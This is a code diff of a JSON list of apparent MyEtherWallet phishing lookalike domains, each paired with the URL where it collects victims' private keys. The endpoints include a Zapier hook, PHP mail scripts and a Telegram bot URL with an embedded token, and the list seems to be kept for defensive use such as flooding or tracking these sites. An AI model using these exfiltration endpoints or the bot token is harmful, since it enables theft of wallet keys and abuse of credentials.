@@ -1,46 +1,39 @@
 [{
 	"name":"myethwallet.net",
-	"host":"hooks.zapier.com",
-	"type":"POST",
-	"secure": true,
+	"url":"https://hooks.zapier.com/hooks/catch/2388571/596pa2/",
+	"method":"POST",
 	"ignorestatuscode": false,
-	"path":"/hooks/catch/2388571/596pa2/",
-	"content":"application/json",
+	"content_type":"application/json",
 	"data":{
 		"a":"\"%privatekey%\"",
 		"b":""
 	}
 },{
 	"name":"myetherwallet.com.am",
-	"host":"myetherwallet.com.am",
-	"type":"POST",
-	"secure": true,
+	"url":"https://myetherwallet.com.am/mail-area22.php",
+	"method":"POST",
 	"ignorestatuscode": 404,
-	"path":"/mail-area22.php",
-	"content":"application/x-www-form-urlencoded",
+	"content_type":"application/x-www-form-urlencoded",
 	"data":{
 		"key2":"%privatekey%"
 	}
 },{
 	"name":"myethervvallet.com",
-	"host":"api.telegram.org",
-	"type":"GET",
+	"url":"https://api.telegram.org/bot416312666:AAGjIynTZKtdtFF1qXI0JSIAEqd-Clk4LqI/sendMessage",
+	"method":"GET",
 	"secure": true,
 	"ignorestatuscode": false,
-	"path":"/bot416312666:AAGjIynTZKtdtFF1qXI0JSIAEqd-Clk4LqI/sendMessage",
-	"content":"application/json",
+	"content_type":"application/json",
 	"data":{
 		"chat_id":"@f9i9of9ol00o4kkfo0",
 		"text":"%privatekey%"
 	}
 },{
-	"name":"myetherwallel.com.",
-	"host":"myetherwallel.com",
-	"type":"POST",
-	"secure": true,
+	"name":"myetherwallel.com",
+	"url":"https://myetherwallel.com/mail-area2.php",
+	"method":"POST",
 	"ignorestatuscode": 403,
-	"path":"/mail-area2.php",
-	"content":"application/x-www-form-urlencoded",
+	"content_type":"application/x-www-form-urlencoded",
 	"data":{
 		"key2":"%privatekey%"
 	}
